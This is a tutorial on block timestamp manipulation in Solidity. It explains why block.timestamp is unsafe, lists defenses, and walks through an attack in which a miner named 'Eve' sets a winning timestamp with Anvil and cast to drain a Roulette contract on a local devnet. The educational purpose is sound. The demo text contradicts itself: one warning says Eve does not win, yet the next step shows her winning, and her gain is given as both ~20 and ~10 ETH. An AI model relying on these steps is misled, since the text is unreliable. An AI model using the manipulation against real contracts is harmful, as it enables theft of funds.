# Block Timestamp Manipulation

**Reference:** [Solidity by Example - Block Timestamp Manipulation](https://solidity-by-example.org/hacks/block-timestamp-manipulation/)

## 🎯 Vulnerability

Contracts that rely on `block.timestamp` for critical logic can be exploited by miners/validators who have control over when blocks are produced and can manipulate timestamps within protocol constraints.

### What is `block.timestamp`?

`block.timestamp` is **NOT**:
- ❌ The user's local wall-clock time
- ❌ A perfectly accurate global clock
- ❌ Enforced to be "exact"

`block.timestamp` **IS**:
- ✅ A value **chosen by the block producer** (miner/validator)
- ✅ Subject to protocol validation rules
- ✅ Slightly manipulable within allowed bounds

---

## ⚠️ Why It Can Be Manipulated

Block producers have flexibility in setting timestamps, constrained by two rules:

### Constraint 1: Cannot Go Backwards
```
block.timestamp > parentBlock.timestamp
```
- Guarantees **monotonicity** (time always moves forward)
- Miners cannot rewind time

### Constraint 2: Cannot Be Too Far in the Future
- Small future offsets (seconds) → ✅ Allowed
- Large future offsets (hours/days) → ❌ Block rejected

This gives miners a **narrow window** to manipulate timestamps for their advantage.

---

## 🛡️ Defense: What to Use Instead

When precision matters, **avoid `block.timestamp` for critical logic**:

1. **Block numbers** for ordering: `block.number`
2. **Commit-reveal schemes** for fairness
3. **External oracles** (e.g., Chainlink) for real-world time
4. **Minimum buffers** (e.g., +5 minutes) for deadlines to make manipulation impractical

---

## 🧪 Demonstration: Timestamp Manipulation Attack

The `Roulette` contract pays out all funds if `block.timestamp % 15 == 0`. Eve (the miner) will manipulate the timestamp to win.


### Prerequisites

Start Anvil in a separate terminal:

```bash
anvil
```

Compile the contracts:

```bash
forge build
```

---

### Step 1: Alice Deploys the Roulette Contract with 10 ETH

Alice creates a roulette game where players must send 10 ETH and win if `block.timestamp % 15 == 0`.

**Alice's Account:**
- Address: `0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266`
- Private Key: `0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80`

```bash
forge create src/blockTimestampManipulation/BlockTimestamp.sol:Roulette \
  --rpc-url http://127.0.0.1:8545 \
  --value 10ether \
  --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 \
  --broadcast
```

**Output:**
```
Contract deployed to: 0x5FbDB2315678afecb367f032d93F642f64180aa3
```

Check the contract balance:

```bash
cast balance 0x5FbDB2315678afecb367f032d93F642f64180aa3 -e
```

**Output:**
```
10.000000000000000000 ETH
```

---

### Step 2: Eve (the Miner) Manipulates the Timestamp

Eve is a miner who can control block timestamps. She will manipulate the timestamp to ensure `block.timestamp % 15 == 0` when her transaction executes.

**Eve's Account:**
- Address: `0x70997970C51812dc3A010C7d01b50e0d17dc79C8`
- Private Key: `0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d`

Check Eve's balance before the attack:

```bash
cast balance 0x70997970C51812dc3A010C7d01b50e0d17dc79C8 -e
```

**Output:**
```
10000.000000000000000000 ETH
```

---

### Step 3: Eve Calculates and Sets the Winning Timestamp

Eve calculates the next timestamp divisible by 15 and sets it for her transaction:

```bash
# Calculate the next timestamp that is a multiple of 15
current_timestamp=$(cast block latest -f timestamp)
next_multiple=$(( ((current_timestamp / 15) + 1) * 15 ))
echo "Setting next block timestamp to: $next_multiple (divisible by 15)"

# Set the timestamp and IMMEDIATELY call spin() - use && to chain commands
cast rpc anvil_setNextBlockTimestamp $next_multiple && \
cast send 0x5FbDB2315678afecb367f032d93F642f64180aa3 \
  "spin()" \
  --value 10ether \
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d
```

**Output:**
```
Setting next block timestamp to: 1768833240 (divisible by 15)

blockHash            0x...
blockNumber          2
status               1 (success)
...
```

**⚠️ Critical:** Even though you can set the timestamp Eve doesn't win the lottery.

---

### Step 4: Verify Eve Won the Roulette

Check Eve's balance after the attack:

```bash
cast balance 0x70997970C51812dc3A010C7d01b50e0d17dc79C8 -e
```

**Output:**
```
10010.000000000000000000 ETH (approximately, minus gas fees)
```

**Eve gained ~20 ETH!** 🎰
- She sent 10 ETH to play
- She received 20 ETH back (her 10 ETH + Alice's 10 ETH)
- Net profit: ~10 ETH (minus gas)

Verify the contract is now empty:

```bash
cast balance 0x5FbDB2315678afecb367f032d93F642f64180aa3 -e
```

**Output:**
```
0.000000000000000000 ETH
```

---

## 🔍 How the Attack Works

1. **Eve observes the game rules:** Win if `block.timestamp % 15 == 0`
2. **Eve calculates the winning timestamp:** Next timestamp divisible by 15
3. **Eve manipulates the block:** As a miner, she sets the timestamp for her block
4. **Eve submits her transaction:** The `spin()` call executes in a block with her chosen timestamp
5. **Condition satisfied:** `block.timestamp % 15 == 0` → Eve wins all the funds

**Key Insight:** Miners can manipulate timestamps within protocol bounds, making `block.timestamp` unsafe for critical game logic!

---

## 🎓 Key Takeaways

1. **Never use `block.timestamp` for critical randomness or game outcomes**
2. **Miners have ~15 seconds of manipulation power** on Ethereum
3. **Use commit-reveal schemes or VRF** (Verifiable Random Functions) for fair games
4. **Add sufficient time buffers** if using timestamps for deadlines
5. **Consider `block.number` instead** for ordering or time-based logic where precision isn't critical